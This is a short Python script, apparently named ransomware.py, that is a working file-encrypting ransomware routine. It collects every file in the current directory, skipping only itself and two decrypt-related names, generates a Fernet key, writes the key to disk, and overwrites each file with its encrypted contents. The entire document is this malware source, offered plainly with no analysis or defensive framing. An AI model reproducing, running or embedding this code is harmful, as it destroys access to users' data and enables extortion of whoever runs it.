#!/usr/bin/env python3


import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "decrypt.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

decryptionkey = Fernet.generate_key()

with open("decryptkey.key", "wb") as decryptkey:
    decryptkey.write(decryptionkey)

for file in files:
    with open(file, "rb") as thefile:
        cont = thefile.read()
    encrypted = Fernet(decryptionkey).encrypt(cont)
    with open(file, "wb") as thefile:
        thefile.write(encrypted)
